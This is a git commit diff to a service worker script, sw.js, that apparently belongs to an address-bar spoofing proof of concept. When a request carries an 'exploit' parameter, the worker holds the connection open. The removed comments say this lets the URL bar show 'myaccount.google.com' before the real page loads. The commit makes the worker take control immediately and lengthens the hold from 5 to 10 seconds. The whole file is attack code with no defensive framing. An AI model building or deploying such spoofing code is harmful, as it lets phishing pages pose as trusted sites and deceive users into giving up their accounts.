31f378711edff559f9a4ab46c25a8382a5aab910
Not AI <56167660+imnotanaiaccount@users.noreply.github.com>
2026-05-05 20:38:44 -0400

    Update sw.js

--- sw.js
+++ sw.js
@@ -1,16 +1,22 @@
 // sw.js
+self.addEventListener('install', (event) => {
+    self.skipWaiting(); // Force the new version to activate
+});
+
+self.addEventListener('activate', (event) => {
+    event.waitUntil(clients.claim()); // Take control of the page immediately
+});
+
 self.addEventListener('fetch', (event) => {
     const url = new URL(event.request.url);
 
-    // If we see the exploit trigger, hold the connection open
     if (url.searchParams.has('exploit')) {
         event.respondWith(
             new Promise((resolve) => {
-                // The URL bar will update to 'myaccount.google.com' 
-                // but we wait 5 seconds before actually showing the real page.
+                // Hold the connection open for 10 seconds
                 setTimeout(() => {
                     resolve(fetch(event.request));
-                }, 5000);
+                }, 10000);
             })
         );
     }
